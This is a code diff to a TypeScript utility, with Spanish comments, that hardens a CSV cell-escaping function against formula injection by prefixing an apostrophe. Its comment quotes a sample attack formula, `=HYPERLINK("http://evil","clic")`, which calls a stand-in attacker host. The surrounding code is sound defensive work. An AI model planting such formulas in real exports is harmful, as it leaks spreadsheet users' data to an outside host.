@@ -60,15 +60,39 @@ export function formatDateTime(d: string | null): string {
 }
 
 /**
- * Celda CSV segura según RFC 4180 — fuente única del dialecto CSV de
- * la app (exportadores de campañas en history-panel.tsx y de
- * conocimiento en knowledge-export.ts): envuelve entre comillas dobles
- * toda celda que contenga el separador («;»), comillas o salto de
- * línea, duplicando las comillas internas. Así los títulos con
- * «;», comillas o saltos no rompen la columna ni la fila.
+ * Celda CSV segura — fuente única del dialecto CSV de la app
+ * (exportadores de campañas en history-panel.tsx, de conocimiento en
+ * knowledge-export.ts y de telemetría anunciado para la ficha).
+ *
+ * Dos mecanismos, en este orden:
+ *
+ *   1. Neutralización de fórmulas (hardening HD2, Ronda 16 de bugs —
+ *      hallazgo HD2 de la Ronda 14; técnica OWASP «CSV Injection»):
+ *      una celda que EMPIEZA por `=`, `+`, `-` o `@` (o tab/CR, que
+ *      permiten smuggle de prefijo) se interpreta como fórmula al abrir
+ *      el fichero en Excel/LibreOffice/Sheets — p. ej.
+ *      `=HYPERLINK("http://evil","clic")` filtra interacciones sin
+ *      confirmación previa. Se prefija un apóstrofe visible mínimo para
+ *      que la hoja la trate como texto. El contenido de las celdas es
+ *      semilibre (títulos, contenido y tags generados por el LLM), de
+ *      modo que la neutralización vive en la fuente única y cubre todos
+ *      los exportadores sin que ninguno la repita. Se comprueba el
+ *      PRIMER carácter tal cual (sin recortar): una celda con espacio
+ *      inicial ya es texto inerte para la hoja, y recortar alteraría el
+ *      dato. Nota de alcance: las celdas numéricas negativas legítimas
+ *      también se prefijan — ningún dato actual de los exportadores es
+ *      negativo (recuentos ≥ 0, progreso acotado [0,100] por el clamp
+ *      del motor); si un exportador futuro necesita negativos, será
+ *      decisión explícita suya relajar el prefijo para `-N`.
+ *
+ *   2. Escapado RFC 4180: si la celda contiene el separador («;»),
+ *      comillas o salto de línea, se envuelve entre comillas dobles
+ *      duplicando las comillas internas. Así los títulos con «;»,
+ *      comillas o saltos no rompen la columna ni la fila.
  */
 export function csvEscapeCell(v: string | number): string {
-  const s = String(v)
+  let s = String(v)
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`
   return /[";\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
 }
 
